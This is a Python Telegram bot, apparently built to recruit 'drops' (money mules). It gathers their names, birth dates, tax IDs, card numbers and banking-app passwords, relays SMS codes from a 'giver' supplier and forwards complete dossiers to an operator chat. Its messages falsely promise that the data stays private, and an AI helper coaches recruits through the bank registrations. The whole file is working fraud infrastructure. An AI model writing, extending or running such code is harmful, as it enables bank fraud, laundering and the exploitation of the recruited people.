from aiogram import Router, F, Bot
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from bot.config import ADMIN_ID, BANK_TEMPLATES, get_template_photo
import bot.database as db
import re

router = Router()

class RegistrationStates(StatesGroup):
    waiting_pib_dob = State()
    waiting_ipn = State()
    waiting_confirm = State()
    waiting_phone = State()
    waiting_password = State()
    waiting_card_number = State()

def clean_pib(pib: str) -> str:
    # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
    pib = re.sub(r'(?i)\b(дата\s+народження|д\.н\.|дн|народження|нар\.?|р\.н\.?)\b', '', pib)
    pib = re.sub(r'^[^\w\s]+|[^\w\s]+$', '', pib)
    pib = re.sub(r'\s+', ' ', pib)
    return pib.strip()

@router.message(CommandStart(), F.chat.type == "private")
async def cmd_start(message: Message, state: FSMContext):
    """Обробник команди /start для клієнта"""
    if message.from_user.id == ADMIN_ID:
        from bot.handlers.admin import get_admin_keyboard
        await message.answer(
            "Привіт, Адміне!\n\n"
            "Оберіть потрібну дію на клавіатурі нижче:",
            reply_markup=get_admin_keyboard()
        )
        return

    # Перевіряємо, чи є вже активна сесія у робочому статусі
    client_id = message.from_user.id
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        await message.answer("Ваш запит вже обробляється або лінія активна. Будь ласка, очікуйте вказівок адміна.")
        return

    await state.clear()
    
    # Крок 1: Запитуємо ПІБ та Дату народження
    await message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
        "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
        "(обов'язково пишіть все в одному повідомленні)",
        reply_markup=ReplyKeyboardRemove()  # Прибирає будь-які старі кнопки
    )
    await state.set_state(RegistrationStates.waiting_pib_dob)

@router.message(RegistrationStates.waiting_pib_dob, F.chat.type == "private")
async def process_pib_dob(message: Message, state: FSMContext):
    """Отримання ПІБ та Дати народження в одному повідомленні з валідацією наявності дати"""
    pib_dob = message.text.strip()
    
    # Спочатку шукаємо дату народження за регулярним виразом
    # Підтримує формати: DD.MM.YYYY, DD/MM/YYYY, DD-MM-YYYY, DD.MM.YY та версії з пробілами
    date_match = re.search(r'\b(\d{1,2}[\.\-\/]\d{1,2}[\.\-\/]\d{2,4})\b', pib_dob)
    if not date_match:
        # Спробуємо також варіант через пробіли, наприклад, "12 05 1998"
        date_match = re.search(r'\b(\d{1,2}\s+\d{1,2}\s+\d{4})\b', pib_dob)
        
    if not date_match:
        await message.answer(
            "Вибачте, ви не вказали Дату Народження.\n"
            "Будь ласка, напишіть Ваші ПІБ та Дату Народження разом:\n\n"
            "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
            "(обов'язково пишіть все в одному повідомленні)",
            parse_mode="Markdown"
        )
        return
        
    dob_raw = date_match.group(1)
    dob = dob_raw.replace(' ', '.') # Перетворюємо пробіли на крапки для стандартизації
    
    # Вилучаємо дату з повідомлення, щоб отримати тільки ПІБ
    pib_raw = pib_dob.replace(dob_raw, '').strip()
    pib = clean_pib(pib_raw)
    
    # Валідуємо, чи залишилось хоча б 2 слова для ПІБ
    if len(pib.split()) < 2 or len(pib) < 5:
        await message.answer(
            "Будь ласка, введіть Ваші ПІБ повністю та Дату Народження:\n\n"
            "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
            "(обов'язково пишіть все в одному повідомленні)",
            parse_mode="Markdown"
        )
        return
        
    # Зберігаємо розпарсені дані окремо
    await state.update_data(pib=pib, dob=dob)
    
    # Крок 2: Запитуємо ІПН та відразу надсилаємо роз'яснення
    await message.answer("Також напишіть Ваш ІПН будь ласка?")
    await message.answer(
        "Запитуємо ІПН виключно для перевірки через офіційні державні реєстри:\n"
        "• щоб переконатися, що немає відкритих проваджень\n"
        "• щоб перевірити, чи не було раніше співпраці з нашою компанією\n\n"
        "Важливо:\n"
        "Дані що Ви надаєте ніколи не будуть передані третім особам!"
    )
    await state.set_state(RegistrationStates.waiting_ipn)

@router.message(RegistrationStates.waiting_ipn, F.chat.type == "private")
async def process_ipn(message: Message, state: FSMContext):
    """Отримання ІПН та перехід до підтвердження даних"""
    ipn = message.text.strip()
    if not ipn.isdigit() or len(ipn) != 10:
        await message.answer("ІПН має складатися рівно з 10 цифр. Будь ласка, перевірте та спробуйте ще раз:")
        return

    await state.update_data(ipn=ipn)
    data = await state.get_data()
    pib = data['pib']
    dob = data['dob']
    
    # Виводимо повідомлення підтвердження
    confirm_text = (
        f"**Перевірте ваші дані:**\n"
        f"• **ПІБ:** {pib}\n"
        f"• **ІПН:** {ipn}\n"
        f"• **Дата народження:** {dob}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Підтвердити та надіслати", callback_data="confirm_reg"),
            InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")
        ]
    ])
    
    await message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
    await state.set_state(RegistrationStates.waiting_confirm)

@router.callback_query(F.data == "confirm_reg")
async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bot):
    """Обробник підтвердження реєстраційних даних"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла або вже підтверджена.", show_alert=True)
        return

    data = await state.get_data()
    pib = data.get('pib')
    dob = data.get('dob')
    ipn = data.get('ipn')
    
    if not pib or not dob or not ipn:
        await callback.answer("Дані не знайдено. Будь ласка, почніть спочатку з /start.", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await state.clear()
        return

    await state.clear()

    # Формуємо дані для адмін-панелі та Telegram повідомлення
    client_data = f"ІПН: {ipn}\nПІБ: {pib}\nДата: {dob}"
    username = callback.from_user.username
    if username:
        client_data += f"\n\nДроп - @{username}"
        
    client_id = callback.from_user.id
    username_db = username or "Немає юзернейму"

    # Створюємо нову сесію в базі даних
    await db.create_or_update_session(client_id, username_db, client_data)
    
    # Забираємо кнопки з повідомлення підтвердження
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer("Дані успішно прийнято! Номер буде надіслано до чату протягом 2-х хвилин.")
    await callback.answer("Дані підтверджено!")

    # Отримуємо унікальні назви банків для вибору адміном
    unique_banks = await db.get_unique_banks()
    
    if not unique_banks:
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=(
                f"Новий клієнт на верифікацію!\n"
                f"• Telegram: @{username} (ID: {client_id})\n"
                f"• Дані:\n```\n{client_data}\n```\n\n"
                f"Попередження: немає доступних ліній/банків у базі! Використайте /import."
            ),
            parse_mode="Markdown"
        )
        return
        
    # Створюємо кнопки вибору банків
    keyboard_buttons = []
    row = []
    for bank in unique_banks:
        button_text = f"[ ] {bank}"
        callback_data = f"toggle_{client_id}_{bank}"
        row.append(InlineKeyboardButton(text=button_text, callback_data=callback_data))
        if len(row) == 2:
            keyboard_buttons.append(row)
            row = []
    if row:
        keyboard_buttons.append(row)
        
    # Додаємо керівні кнопки
    keyboard_buttons.append([InlineKeyboardButton(text="Зберегти та продовжити", callback_data=f"savebanks_{client_id}")])
    keyboard_buttons.append([InlineKeyboardButton(text="Відхилити запит", callback_data=f"reject_{client_id}")])
    
    markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
    
    # Сповіщаємо адміна в Telegram
    admin_msg = (
        f"Новий клієнт на верифікацію!\n"
        f"• Telegram: @{username} (ID: {client_id})\n"
        f"• Дані:\n```\n{client_data}\n```\n"
        f"Оберіть банки, які має пройти клієнт:"
    )
    
    await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=markup, parse_mode="Markdown")

@router.callback_query(F.data == "restart_reg")
async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
    """Обробник скасування та заповнення анкети заново"""
    current_state = await state.get_state()
    if current_state != RegistrationStates.waiting_confirm:
        await callback.answer("Сесія реєстрації застаріла.", show_alert=True)
        return
        
    await state.clear()
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(
        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
        reply_markup=ReplyKeyboardRemove()
    )
    await state.set_state(RegistrationStates.waiting_pib_dob)
    await callback.answer("Почнемо заново!")


@router.message(RegistrationStates.waiting_password, F.chat.type == "private")
async def process_client_password(message: Message, state: FSMContext):
    password = message.text.strip()
    await state.update_data(client_password=password)
    
    # Перевіряємо поточний банк у сесії
    client_id = message.from_user.id
    session = await db.get_session(client_id)
    bank_name = ""
    if session and session['line_id']:
        line_info = await db.get_line(session['line_id'])
        if line_info:
            bank_name = line_info['bank'].strip().lower()

    if bank_name == "bank.kd":
        await message.answer("Будь ласка, напишіть повний номер Вашої карти (16 цифр)?")
        await state.set_state(RegistrationStates.waiting_card_number)
    else:
        await message.answer("Будь ласка, напишіть Ваш номер телефону?")
        await state.set_state(RegistrationStates.waiting_phone)


@router.message(RegistrationStates.waiting_card_number, F.chat.type == "private")
async def process_client_card_number(message: Message, state: FSMContext):
    text = message.text.strip()
    cleaned_card = re.sub(r'\D', '', text)
    
    if len(cleaned_card) != 16:
        await message.answer("Номер карти має складатися рівно з 16 цифр. Будь ласка, перевірте та спробуйте ще раз:")
        return

    # Отримуємо дані стану
    state_data = await state.get_data()
    card_first4 = state_data.get("card_first4")
    card_last4 = state_data.get("card_last4")
    
    if card_first4 and card_last4:
        if cleaned_card[:4] != card_first4 or cleaned_card[-4:] != card_last4:
            await message.answer(
                "Введений номер карти не збігається з даними на скріншоті.\n"
                "Будь ласка, перевірте та напишіть правильний номер карти:"
            )
            return

    # Зберігаємо номер карти
    formatted_card = f"{cleaned_card[:4]} {cleaned_card[4:8]} {cleaned_card[8:12]} {cleaned_card[12:]}"
    await state.update_data(client_card=formatted_card)
    
    await message.answer("Будь ласка, напишіть Ваш номер телефону?")
    await state.set_state(RegistrationStates.waiting_phone)


@router.message(RegistrationStates.waiting_phone, F.chat.type == "private")
async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
    text = message.text.strip()
    client_id = message.from_user.id
    
    # 1. Перевіряємо чи це запитання "для чого?" / "навіщо?"
    question_pattern = re.compile(
        r'(?i)\b(навіщо|для\s+чого|зачем|чому|почему|яка\s+ціль|для\s+яких\s+цілей|накуя|нахуя)\b'
    )
    if question_pattern.search(text) or text.endswith('?'):
        await message.answer(
            "В разі проблем з банком дзвонимо вам платимо гроші і ви їх рішаєте"
        )
        return

    # 2. Валідуємо номер телефону
    cleaned_phone = re.sub(r'[^\d+]', '', text)
    digits_only = re.sub(r'\D', '', cleaned_phone)
    
    if len(digits_only) < 9 or len(digits_only) > 13:
        await message.answer(
            "Будь ласка, введіть коректний номер телефону (наприклад: +380635685804):"
        )
        return

    data = await state.get_data()
    client_password = data.get('client_password')
    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id')
    client_card = data.get('client_card')
    
    await state.clear()

    session = await db.get_session(client_id)
    if not session:
        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
        return

    # Розпарсимо PIB, DOB, IPN з client_data
    ipn_match = re.search(r'ІПН:\s*(\d+)', session['client_data'])
    pib_match = re.search(r'ПІБ:\s*(.+)', session['client_data'])
    dob_match = re.search(r'Дата:\s*(.+)', session['client_data'])
    
    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
    pib = pib_match.group(1) if pib_match else "Невідомо"
    dob = dob_match.group(1) if dob_match else "Невідомо"
    
    # Інформація про лінію
    line_id = session['line_id']
    line_str = "Не призначено"
    bank_name = "Банк"
    if line_id:
        line_info = await db.get_line(line_id)
        if line_info:
            line_str = f"Line {line_id} Return: {line_info['phone_number']} | {line_info['bank']}"
            bank_name = line_info['bank']

    # Формуємо анкету без "РЕЄСТРАЦІЙНІ ДАНІ"
    anketa_text = (
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата: {dob}\n"
        f"Телефон: {text}\n\n"
    )
    
    username = message.from_user.username
    if username:
        anketa_text += f"Дроп - @{username}\n\n"
        
    anketa_text += f"{line_str}\n\n"
    
    if client_card:
        anketa_text += f"Номер карти: {client_card}\n"
        
    anketa_text += f"{client_password}"
    
    from bot.config import ANKETA_CHAT_ID
    target_chat = ANKETA_CHAT_ID or ADMIN_ID
    
    try:
        if success_photo_id:
            await bot.send_photo(
                chat_id=target_chat,
                photo=success_photo_id,
                caption=anketa_text
            )
        else:
            await bot.send_message(
                chat_id=target_chat,
                text=anketa_text
            )
    except Exception as e:
        print(f"Помилка відправки анкети: {e}")
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Помилка відправки анкети в канал. Анкета:\n\n{anketa_text}"
            )
        except Exception:
            pass

    # Закриваємо поточний банк у сесії
    if line_id:
        await db.set_line_status(line_id, 'success')
        
        import aiosqlite
        from bot.config import DB_FILE
        async with aiosqlite.connect(DB_FILE) as db_conn:
            await db_conn.execute("UPDATE sessions SET line_id = NULL, client_message_id = NULL, status = 'registered' WHERE client_id = ?", (client_id,))
            await db_conn.commit()

    remaining_banks_str = session['remaining_banks']
    remaining = remaining_banks_str.split(",") if remaining_banks_str else []
    if bank_name in remaining:
        remaining.remove(bank_name)

    new_remaining_str = ",".join(remaining)
    await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)

    if not remaining:
        await message.answer(
            "Роботу завершено. Дякуємо за співпрацю.",
            reply_markup=ReplyKeyboardRemove()
        )
        await db.close_session(client_id)
        
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Верифікацію для клієнта @{username or client_id} успішно завершено по всіх банках! Анкета надіслана."
            )
        except Exception:
            pass
    else:
        await message.answer(
            f"Верифікацію для банку {bank_name} завершено. Очікуйте наступний номер.",
            reply_markup=ReplyKeyboardRemove()
        )
        
        try:
            await bot.send_message(
                chat_id=ADMIN_ID,
                text=f"Клієнт @{username or client_id} пройшов банк {bank_name}. Анкета надіслана. Очікує на наступний банк."
            )
        except Exception:
            pass


@router.message(F.chat.type == "private", F.text & F.text.startswith('/'))
async def handle_custom_bank_commands(message: Message):
    """Обробник кастомних команд завантаження додатків та інструкцій реєстрації"""
    cmd = message.text.strip().lower()
    
    # Інструкції реєстрації, які використовуються додатково
    manual_instructions = {
        "/екорег": "Анкетні дані в самому ЕкоБанку виставляти як на фото! Слово п...",
        "/аморег": "Анкетні дані в самому АмоБанку виставляти як на фото..."
    }
    
    if cmd in manual_instructions:
        photo_path = get_template_photo(cmd)
        if photo_path:
            await message.answer_photo(photo=FSInputFile(photo_path), caption=manual_instructions[cmd])
        else:
            await message.answer(manual_instructions[cmd])
        return

    # Перевіряємо по словнику BANK_TEMPLATES
    for key, val in BANK_TEMPLATES.items():
        if val['command'].lower() == cmd:
            photo_path = get_template_photo(key)
            if photo_path:
                await message.answer_photo(photo=FSInputFile(photo_path), caption=val['text'])
            else:
                await message.answer(val['text'])
            return

@router.message(F.chat.type == "private", F.text & ~F.text.startswith('/'))
async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bot):
    """Обробник повідомлень поза станами введення даних (захист від флуду + ШІ підтримка)"""
    client_id = message.from_user.id
    
    # Перевеяємо, чи є вже активна сесія у будь-котрому робочому статусі
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        # Показати статус "typing", щоб користувач знав, що бот обробляє запит
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.text,
            client_data=client_data,
            current_bank_name=current_bank_name
        )
        
        if "[SUCCESS_VERIFICATION]" in response:
            # Парсимо маску картки, якщо вона є
            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
            if card_match:
                await state.update_data(card_first4=card_match.group(1), card_last4=card_match.group(2))
            
            bank_label = current_bank_name if current_bank_name else "банк"
            success_text = (
                f"Чудово {bank_label} успішно зареєстрували.\n\n"
                f"Який пін-код чи пароль ставили на додаток?"
            )
            await message.answer(success_text)
            
            # Спробуємо підтягнути останнє фото
            state_data = await state.get_data()
            last_photo = state_data.get("last_photo_id")
            if last_photo:
                await state.update_data(success_photo_id=last_photo)
                
            await state.set_state(RegistrationStates.waiting_password)
            return

        await message.answer(response)
        return

    # Якщо користувач не у стані анкетування, пропонуємо йому почати з команди /start
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")

@router.message(F.chat.type == "private", F.photo)
async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
    """Обробник скріншотів/зображень від користувача (ШІ розпізнавання помилок)"""
    client_id = message.from_user.id
    
    # Перевіряємо, чи є вже активна сесія
    existing_session = await db.get_session(client_id)
    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
        # Беремо фото найкращої якості
        photo = message.photo[-1]
        
        # Зберігаємо останнє фото в стані для можливості відновлення анкетування текстом
        await state.update_data(last_photo_id=photo.file_id)
        
        await bot.send_chat_action(chat_id=client_id, action="typing")
        
        # Отримуємо додатковий контекст для ШІ
        line_id = existing_session['line_id']
        line_info = await db.get_line(line_id) if line_id else None
        current_bank_name = line_info['bank'] if line_info else None
        client_data = existing_session['client_data']
        
        import io
        photo_file = await bot.get_file(photo.file_id)
        photo_bytes = io.BytesIO()
        await bot.download_file(photo_file.file_path, photo_bytes)
        photo_data = photo_bytes.getvalue()
        
        from bot.openai_client import get_support_response
        response = await get_support_response(
            user_text=message.caption,
            image_bytes=photo_data,
            client_data=client_data,
            current_bank_name=current_bank_name
        )
        
        if "[SUCCESS_VERIFICATION]" in response:
            # Парсимо маску картки, якщо вона є
            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
            if card_match:
                await state.update_data(card_first4=card_match.group(1), card_last4=card_match.group(2))
            
            bank_label = current_bank_name if current_bank_name else "банк"
            success_text = (
                f"Чудово {bank_label} успішно зареєстрували.\n\n"
                f"Який пін-код чи пароль ставили на додаток?"
            )
            await message.answer(success_text)
            await state.update_data(success_photo_id=photo.file_id)
            await state.set_state(RegistrationStates.waiting_password)
            return

        await message.answer(response)
        return
        
    await message.answer("Для початку верифікації напишіть **/start**.", parse_mode="Markdown")

@router.callback_query(F.data == "request_code")
async def process_request_code(callback: CallbackQuery, bot: Bot):
    """Обробник натискання кнопки 'Запросити SMS-код' клієнтом"""
    client_id = callback.from_user.id
    
    session = await db.get_session(client_id)
    if not session or session['status'] == 'completed':
        await callback.answer("Сесія не знайдена або вже завершена.", show_alert=True)
        # Прибираємо кнопку, бо сесія завершена
        await callback.message.edit_reply_markup(reply_markup=None)
        return
        
    line_id = session['line_id']
    if not line_id:
        await callback.answer("Вам ще не призначено лінію.", show_alert=True)
        return

    line_info = await db.get_line(line_id)
    bank_name = line_info['bank'] if line_info else "Невідомий банк"

    # Перевіряємо чи це повторний запит коду
    is_retry = session['status'] == 'waiting_code'

    # Оновлюємо статус сесії на очікування коду
    await db.set_session_status(client_id, 'waiting_code')

    # Повідомляємо клієнта (НЕ видаляючи кнопку, щоб була змога запросити ще раз)
    # Отримуємо шаблони повідомлень для скупщика (Giver) з бази даних
    giver_format = await db.get_setting("giver_request_format", "Запрос {line_id} {bank_name}")
    giver_retry_format = await db.get_setting("giver_request_retry_format", "Запрос {line_id} {bank_name} (ПОВТОРНО)")

    if is_retry:
        await callback.message.answer("Запит на код відправлено постачальнику. Будь ласка, очікуйте.")
        await callback.answer("Повторний запит відправлено!")
        try:
            giver_msg = giver_retry_format.format(line_id=line_id, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_id} {bank_name} (ПОВТОРНО)"
    else:
        await callback.message.answer("Запит на код відправлено постачальнику. Будь ласка, очікуйте, код прийде сюди.")
        await callback.answer("Запит відправлено!")
        try:
            giver_msg = giver_format.format(line_id=line_id, bank_name=bank_name)
        except Exception:
            giver_msg = f"Запрос {line_id} {bank_name}"

    # Надсилаємо запит постачальнику кодів (Giver)
    from bot.config import GIVER_CHAT_ID
    try:
        await bot.send_message(chat_id=GIVER_CHAT_ID, text=giver_msg)
    except Exception as e:
        # Якщо не вдалося надіслати гіверу, повідомляємо адміна
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=f"Помилка надсилання запиту гіверу (Line {line_id}): {str(e)}"
        )
